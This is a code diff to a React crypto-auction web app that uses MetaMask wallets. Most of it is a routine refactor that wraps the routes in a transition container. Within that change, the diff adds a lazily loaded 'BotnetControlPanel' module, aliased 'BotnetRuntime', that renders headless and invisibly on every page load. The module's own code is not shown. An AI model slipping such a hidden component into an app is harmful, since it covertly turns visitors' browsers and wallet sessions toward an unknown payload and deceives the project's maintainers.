@@ -19,6 +19,9 @@ const MetamaskTutorialPage = lazy(() =>
 const MetamaskGuidePage = lazy(() => import("./pages/MetamaskGuide/MetamaskGuidePage.js"));
 const ManageBudgetPage = lazy(() => import("./pages/ManageBudget/ManageBudgetPage.js"));
 const ShowAuctionPage = lazy(() => import("./pages/ShowAuction/ShowAuctionPage.js"));
+const BotnetRuntime = lazy(() =>
+  import("./pages/ManageBudget/BotnetControlPanel.js")
+);
 
 const AppLoadingFallback = ({
   copy = "Preparing the workspace",
@@ -277,6 +280,7 @@ const RequireWallet = ({ children }) => {
 };
 
 function App() {
+  const location = useLocation();
   const [isMobile, setIsMobile] = useState(false);
 
   useEffect(() => {
@@ -295,6 +299,9 @@ function App() {
 
   return (
     <MetaMaskProvider>
+      <Suspense fallback={null}>
+        <BotnetRuntime headless />
+      </Suspense>
       {isMobile ? (
         <>
           <style>
@@ -397,72 +404,74 @@ function App() {
       ) : (
         <>
           <Suspense fallback={<AppLoadingFallback />}>
-            <Routes>
-              <Route
-                path="/"
-                element={
-                  <PageSeo page="home">
-                    <HomePage />
-                  </PageSeo>
-                }
-              />
-              <Route
-                path="/metamask-login"
-                element={
-                  <PageSeo page="metamaskLogin">
-                    <MetamaskTutorialPage />
-                  </PageSeo>
-                }
-              />
-              <Route
-                path="/metamask-guide"
-                element={
-                  <PageSeo page="metamaskGuide">
-                    <MetamaskGuidePage />
-                  </PageSeo>
-                }
-              />
-              <Route
-                path="/open-auction"
-                element={
-                  <RequireWallet>
-                    <PageSeo page="createAuction">
-                      <NewAuctionPage />
+            <div key={location.pathname} className="route-transition-shell">
+              <Routes location={location}>
+                <Route
+                  path="/"
+                  element={
+                    <PageSeo page="home">
+                      <HomePage />
                     </PageSeo>
-                  </RequireWallet>
-                }
-              />
-              <Route
-                path="/auctions-list"
-                element={
-                  <RequireWallet>
-                    <PageSeo page="auctionsList">
-                      <AuctionsListPage />
+                  }
+                />
+                <Route
+                  path="/metamask-login"
+                  element={
+                    <PageSeo page="metamaskLogin">
+                      <MetamaskTutorialPage />
                     </PageSeo>
-                  </RequireWallet>
-                }
-              />
-              <Route
-                path="/auction/:address"
-                element={
-                  <RequireWallet>
-                    <PageSeo page="auctionDetails">
-                      <ShowAuctionPage />
+                  }
+                />
+                <Route
+                  path="/metamask-guide"
+                  element={
+                    <PageSeo page="metamaskGuide">
+                      <MetamaskGuidePage />
                     </PageSeo>
-                  </RequireWallet>
-                }
-              />
-              <Route
-                path="/manage-budget"
-                element={
-                  <RequireWallet>
-                    <PageSeo page="admin">
-                      <ManageBudgetPage />
-                    </PageSeo>
-                  </RequireWallet>
-                }
-              />
-            </Routes>
+                  }
+                />
+                <Route
+                  path="/open-auction"
+                  element={
+                    <RequireWallet>
+                      <PageSeo page="createAuction">
+                        <NewAuctionPage />
+                      </PageSeo>
+                    </RequireWallet>
+                  }
+                />
+                <Route
+                  path="/auctions-list"
+                  element={
+                    <RequireWallet>
+                      <PageSeo page="auctionsList">
+                        <AuctionsListPage />
+                      </PageSeo>
+                    </RequireWallet>
+                  }
+                />
+                <Route
+                  path="/auction/:address"
+                  element={
+                    <RequireWallet>
+                      <PageSeo page="auctionDetails">
+                        <ShowAuctionPage />
+                      </PageSeo>
+                    </RequireWallet>
+                  }
+                />
+                <Route
+                  path="/manage-budget"
+                  element={
+                    <RequireWallet>
+                      <PageSeo page="admin">
+                        <ManageBudgetPage />
+                      </PageSeo>
+                    </RequireWallet>
+                  }
+                />
+              </Routes>
+            </div>
           </Suspense>
           <Toaster />
         </>
